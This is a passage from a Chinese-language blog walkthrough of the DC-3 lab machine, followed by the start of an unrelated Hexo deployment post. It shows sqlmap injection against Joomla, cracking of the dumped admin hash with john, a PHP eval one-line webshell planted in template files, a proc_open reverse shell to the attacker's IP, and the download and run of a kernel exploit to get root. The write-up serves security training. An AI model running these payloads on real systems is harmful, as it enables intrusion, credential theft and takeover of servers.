alt="image-20240702235648824"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-string">&quot;#__users&quot;</span> --columns -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-T</code>：用于指定目标数据库中的表名。因为数据库名是<code>#__users</code>，但是<code>#</code>在数据库中又表示注释符号，所以需要给给这个字段添加一对双引号，以防止错误解析。</p><p><code>--columns</code>：该参数指示sqlmap列出指定表的所有列。</p><p>在实际的命令运行过程中，会发生有三个需要输入选项的地方，前两个选<code>y</code>之后那个需要选择字典wordlist的地方就什么都不选直接 回车等待结果就好了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703150454303.png" alt="image-20240703150454303"></p><p>得到<code>joomladb数据库</code>的表为<code> #__users</code>的<code>列</code>相关信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703150540777.png" alt="image-20240703150540777"></p><p>可以发现其中有名为<code> name 、password、 username</code>的账户信息列。因而我们需要进一步查看这些列的具体信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-string">&quot;#__users&quot;</span> -C name,username,password --dump -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-C </code>：指定要查询的列名，多个列名之间使用逗号进行分隔。</p><p><code>--dump</code>该参数指示sqlmap将从数据库中检索到的数据打印出来。</p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703151043560.png" alt="image-20240703151043560"></p><p>不难想到这是一个管理员的账号，但是密码显然是经过hash加密后的。因此接下来就是要对这个密码进行碰撞破解或是进行重置，将其修改为自己的密码。</p><blockquote><p>name:admin</p><p>username：admin</p><p>password：</p><p>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu </p></blockquote><ul><li>重置密码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *<span class="hljs-built_in">hash</span>*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703152729545.png" alt="image-20240703152729545"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703152857235.png" alt="image-20240703152857235"></p><blockquote><p>.so文件是linux系统中的动态链接库文件，它们通过动态链接的方式在运行时被程序加载。</p></blockquote><p>看了有关于带有<code>hash</code>字样文件的搜索结果，发现其中并没有关于password-hash的加密脚本文件。虽然有几个像的，但是也没有明确显示出就是hash密码加密脚本文件。所以重置密码这个思路可以暂时搁置了。</p><ul><li>碰撞爆破</li></ul><p>使用<code>john</code>工具来实现hash值的碰撞爆破。（kali自带有john）</p><p>首先先将上述获得的管理员密码的hash值保存为<code>user_password_hash.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> user_password_hash.txt<br><br>vim user_password_hash.txt<br><br><span class="hljs-built_in">cat</span> user_password_hash.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154132239.png" alt="image-20240703154132239"></p><p>然后使用john命令进行碰撞爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john user_password_hash.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154228849.png" alt="image-20240703154228849"></p><p>中间标黄的就是碰撞爆破得到的密码：<code>snoopy </code></p><blockquote><p>username：admin</p><p>password：snoopy</p></blockquote><p>ok！尝试去登陆后台管理系统<code>http://192.168.204.132/administrator/</code>！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154538725.png" alt="image-20240703154538725"></p><p>成功！</p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>到处看看管理系统，发现在Extensions下的Templates（模板）有Templates模板块</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154807462.png" alt="image-20240703154807462"></p><p>进入该模板块，发现其中一共有两个模板：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154823270.png" alt="image-20240703154823270"></p><p>点进第一个模板，在左侧目录栏进入<code>index.php</code>文件（正常情况下优先考虑的文件）。</p><blockquote><p>有了PHP文件，就可以考虑各种拿shell的方法，包括但不限于一句话木马。</p><ul><li>一句话木马</li></ul><?php @eval($_POST['shell']);?><p>以 <?php 和 ;?> 分别为开头和结尾，然后使用 @ 符号抑制错误输出，后面接着跟着 一个函数名 用于 执行字符串 作为php代码运行。接着跟一个括号，括号内首先跟一个超全局数组 $_POST ，这里表示获取通过POST方法传递的参数，后面接着一个中括号，括号内为向POST传递的一个（命令）字符串，该（命令）字符串将会被前面的函数执行，就是相当于执行某个命令嘛！</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703160840412.png" alt="image-20240703160840412"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703162717989.png" alt="image-20240703162717989"></p><p>在此处设置放入一句话木马🐎（放在最开始吧）：</p><p>注意！这里去头去尾了哦！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703232034778.png" alt="image-20240703232034778"></p><p>点击左上角的“save &amp; close”对文件进行保存。</p><p>对第二个模板进行相同的一句话木马注入操作，以防止上面所注入一句话木马的模板并不是目标靶机后台管理系统所使用的模板，进而导致失败瓶颈。</p><p>然后通过中国蚁剑进行连接。</p><blockquote><p>kali安装中国蚁剑的教程为：</p><p><a href="https://blog.csdn.net/liver100day/article/details/120222378%EF%BC%88kali%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91%EF%BC%89">https://blog.csdn.net/liver100day/article/details/120222378（kali如何安装蚁剑）</a></p></blockquote><p>安装完kali之后，若想在本地物理主机远程连接以及打开中国蚁剑，那么需要启用X11转发选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -X sweet@192.168.204.128<br></code></pre></td></tr></table></figure><p>连接成功后进入到中国蚁剑文件夹中，执行<code>./AntSword</code>命令：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211405701.png" alt="image-20240703211405701"></p><p>发现在本地物理主机上启动失败。粗错误信息表示应用程序在试图连接到X服务器的显示屏，但无法打开显示。根据gpt问答，可知需要启用X11转发选项，但是我已经启用了，还是没能成功显示。</p><p>当然也有可能是DISPLAY环境变量没正确设置，但是再次尝试有点花费时间和力气。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211719844.png" alt="image-20240703211719844"></p><p>去kali虚拟机上尝试启用中国蚁剑（在kali已经成功安装的基础上）。成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211900066.png" alt="image-20240703211900066"></p><p>右键空白处选择“ADD”添加数据：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213434075.png" alt="image-20240703213434075"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213808540.png" alt="image-20240703213808540"></p><p><code>Shell url</code>:目标靶机的URL地址。</p><p><code>Shell pwd</code>：连接密码，代码参数值，例如 &lt;?php @eval($_POST[‘x’])?;&gt;中的“X”值。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213828518.png" alt="image-20240703213828518"></p><p>选中所添加的连接，右键选择第一项<code>Ternimal</code>打开终端。如果能正确连接上目标靶机URL的话就会显示如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703234428385.png" alt="image-20240703234428385"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>中国蚁剑连接上目标URL之后，模拟的是正常用户访问该URL，只要访问该URL，网页代码就会被启动，一句话木马就会被触发。我们注入的一句话木马要执行的命令是<code>shell</code>提权命令。所以使用上述检测命令检测当前所获得的权限。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703234524751.png" alt="image-20240703234524751"></p><p>根据结果可以发现，尽管已经拿到了shell，但是目前所拥有的权限还不是root权限。因此，还需要进行进一步的提权操作。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Linux提权总结：<a href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>编写通过prop_open反弹shell的php代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 当系统没有禁用proc_open的时候，我们是可以借助proc_open轻松反弹这样的一个shell的。<br>&lt;?php<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;192.168.204.128&#x27;</span>;  // 攻击者的IP地址<br><span class="hljs-variable">$port</span> = 9999;          // 攻击者的端口号<br><br><span class="hljs-variable">$descriptorspec</span> = array(<br>    0 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),   // stdin 是一个管道，子进程从中读取数据<br>    1 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),   // stdout 是一个管道，子进程向其中写入数据<br>    2 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)    // stderr 是一个管道，子进程向其中写入数据<br>);<br><br><span class="hljs-variable">$process</span> = proc_open(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-variable">$ip</span>/<span class="hljs-variable">$port</span> 0&gt;&amp;1&#x27;&quot;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (is_resource(<span class="hljs-variable">$process</span>)) &#123;<br>    fclose(<span class="hljs-variable">$pipes</span>[0]);  // 关闭stdin<br>    fclose(<span class="hljs-variable">$pipes</span>[1]);  // 关闭stdout<br>    fclose(<span class="hljs-variable">$pipes</span>[2]);  // 关闭stderr<br><br>    proc_close(<span class="hljs-variable">$process</span>);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>将这段php代码（掐头去尾）分别加入到两个模板文件中的index.php文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704004311523.png" alt="image-20240704004311523"></p><p>在终端监听设置的端口 <code>9999</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 9999<br></code></pre></td></tr></table></figure><p><code>nc</code>：netstat，用于监听指定端口，可用于读取或写入网络连接的数据。</p><p><code>-l</code>：监听模式，指示其在指定的端口上监听连接请求。</p><p><code>-v</code>：详细模式</p><p><code>-vv</code>：更详细的详细模式</p><p><code>-p</code>：指定监听的端口号</p><p>然后访问目标网页URL<code>http://192.168.204.132/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704004700989.png" alt="image-20240704004700989"></p><p>反弹成功，成功获取<code>www-data</code>的权限，伪装成为用户www-data。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005119035.png" alt="image-20240704005119035"></p><h3 id="检索提权命令"><a href="#检索提权命令" class="headerlink" title="检索提权命令"></a>检索提权命令</h3><h4 id="查看可使用的命令"><a href="#查看可使用的命令" class="headerlink" title="查看可使用的命令"></a>查看可使用的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">compgen -c<br><br>//查看并过滤与模式列表的模式整行匹配的命令<br>compgen -c | grep -E -x <span class="hljs-string">&quot;nmap|vim|vi|nano|bash|less|more|cp|find|git|wget|cat|apt|zip|xxd|time|taskset|sed|pip|ed|tmux|scp|perl|awk|man|env|ftp&quot;</span><br></code></pre></td></tr></table></figure><p><code>-E</code>：表示使用扩展正则表达式进行匹配。</p><p><code>-x</code>：只匹配整行，即完全匹配 模式 中的整行内容，例nmap。即不断章取义的意思</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005209848.png" alt="image-20240704005209848"></p><h4 id="查看具有SUID权限的命令"><a href="#查看具有SUID权限的命令" class="headerlink" title="查看具有SUID权限的命令"></a>查看具有SUID权限的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005240879.png" alt="image-20240704005240879"></p><p>可执行的命令和能够提权的命令之间似乎没用交集，也就是已知的可使用的命令都不能够用来提权。</p><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3><p>通过以下指令查询使用的操作系统信息以及内核相关信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a  // 显示系统信息 -a表示可用信息<br><span class="hljs-built_in">cat</span> /etc/issue   //查看系统的简要说明或欢迎信息<br><span class="hljs-built_in">cat</span> /etc/*-release  //查看系统的发行版本信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005611511.png" alt="image-20240704005611511"></p><p>可以得到的信息是：</p><blockquote><p>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</p><p>Ubuntu 16.04 LTS（VERSION&#x3D;”16.04 LTS (Xenial Xerus)”）</p></blockquote><p>通过searchsploit查找可利用的漏洞代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit ubuntu 16.04<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704010041749.png" alt="image-20240704010041749"></p><p>搜索结果不少，一般来说，文件后缀名为<code>txt</code>的漏洞利用比较容易实现。可以对搜索得到的漏洞进行逐一尝试（一共有六个）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 40937.txt<br>searchsploit -p 40943.txt<br>searchsploit -p 41923.txt<br>searchsploit -p 39773.txt<br>searchsploit -p 39772.txt<br>searchsploit -p 40489.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704110327425.png" alt="image-20240704110327425"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704110814118.png" alt="image-20240704110814118"></p><blockquote><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40937.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40943.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;41923.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;dos&#x2F;39773.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40489.txt</p><p>没有什么有用的提示</p><p>给出了两个利用文件以及文件下载地址</p><p>给出了漏洞概述以及漏洞代码，似乎没有利用方法</p><p>没有什么有用的提示</p><p>给出了漏洞文件的下载地址以及使用方法（√）</p><p>给出了提权方法，但是是利用ipv6的兼容端口复用的，利用方法没给</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704114451762.png" alt="image-20240704114451762"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">（进入到对应目录）<br>./compile.sh<br>./doubleput<br>（等待提权成功）<br><span class="hljs-built_in">id</span>   // 验证当前用户身份，是否提权成功<br></code></pre></td></tr></table></figure><blockquote><p>Proof of Concept（概念验证）: <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552">https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552</a><br>Exploit-DB Mirror（下载镜像）: <a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</a></p></blockquote><p>点击下载镜像之后，跳转到浏览器，自动下载成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704114809119.png" alt="image-20240704114809119"></p><p>嗯！怎么可以在本物理机下载漏洞呢！得下在虚拟机啊！记住要以目标靶机合法用户的身份下载！因为后续要进行提权！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip<br></code></pre></td></tr></table></figure><p>下载并保存成功了！保存文件名为“39772.zip”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121612377.png" alt="image-20240704121612377"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip 39772.zip<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121708628.png" alt="image-20240704121708628"></p><p>创建了一个名为“39772”的文件夹，进入看看它有什么：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 39772<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121729949.png"></p><p>对这两个tar文件进行解压缩：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xvf crasher.tar<br>tar -xvf exploit.tar<br></code></pre></td></tr></table></figure><p>**<code>tar</code>**：是 Linux 和类 Unix 系统中用于处理归档文件的命令。</p><p>**<code>-x</code>**：表示执行解压缩操作（extract），即从归档文件中提取文件。</p><p>**<code>-v</code>**：可选参数，表示详细模式（verbose），在解压缩过程中显示详细信息。</p><p>**<code>-f</code>**：指定要操作的归档文件的名称。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123036561.png" alt="image-20240704123036561"></p><p>查看当前目录下的文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123117671.png" alt="image-20240704123117671"></p><p>第二第三个文件的前缀是不是和前面获得的漏洞利用方法那儿一致呀！进入exploit利用文件（因为我们要利用漏洞嘛），然后执行提权命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ebpf_mapfd_doubleput_exploit<br>./compile.sh<br>./doubleput<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123558257.png" alt="image-20240704123558257"></p><p>根据提示信息，我们现在已经获取了root权限！</p><p>开启交互界面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>验证是否为root权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123736857.png" alt="image-20240704123736857"></p><p>接下来就是要找到那个唯一的flag文件了，启用find命令查找：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704124000907.png" alt="image-20240704124000907"></p><p>cat一下看看啦！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/the-flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704124054377.png" alt="image-20240704124054377"></p><p>至此，所有工作完成！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>sqlmap注入、john碰撞爆破hash、一句话木马注入、通过prop_open反弹shell</p><ul><li><p>拿站后进行提权的方式多样，其中包括</p><ul><li>可执行的二进制文件具有suid权限，特别是相关命令的提权</li><li>内核漏洞脏牛提权</li><li>密码复用提权</li><li>明文root密码提权</li><li>第三方服务提权</li></ul></li><li><p>sqlmap的使用方法多样，通过多种使用方法可以实现不同的效果</p></li><li><p>拿到网站后台管理系统后，可以寻找发布网页或者网页本身内容的php文件，通过插入一句话木马或者反弹shell实现getshell</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>有关部署GitHub博客的坑</title>
    <link href="/2024/06/28/%E6%9C%89%E5%85%B3%E9%83%A8%E7%BD%B2GitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9D%91/"/>
    <url>/2024/06/28/%E6%9C%89%E5%85%B3%E9%83%A8%E7%BD%B2GitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<blockquote><p>也就是说，如果想创建一个新的博客。执行步骤是：</p><ul><li>新建一个空文件夹</li><li>终端进入该文件夹中，hexo init</li><li>需要下载git，npm install hexo-deployer-git -save</li><li>然后修改博客目录下的 _config.yml 文件，修改语言（注意，名字需要先到主题文件夹下的language上查看，不要拼写错名字了）</li><li>添加deploy配置，type（git），repo（仓库的ssh链接），branch（main）</li><li>hexo g</li><li>hexo d</li><li>hexo s查看效果</li></ul></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
